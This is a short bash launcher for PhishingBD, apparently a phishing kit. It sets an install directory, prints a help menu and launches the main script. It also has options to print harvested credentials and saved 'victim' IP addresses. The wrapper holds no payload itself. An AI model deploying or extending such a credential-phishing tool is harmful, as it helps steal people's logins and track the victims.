#!/bin/bash

# https://github.com/deepraj-x/phishingbd

if [[ $(uname -o) == *'Android'* ]];then
	PHISHINGBD_ROOT="/data/data/com.termux/files/usr/opt/phishingbd"
else
	export PHISHINGBD_ROOT="/opt/phishingbd"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run PhishingBD type \`phishingbd\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $PHISHINGBD_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $PHISHINGBD_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $PHISHINGBD_ROOT
	bash ./phishingbd.sh
fi
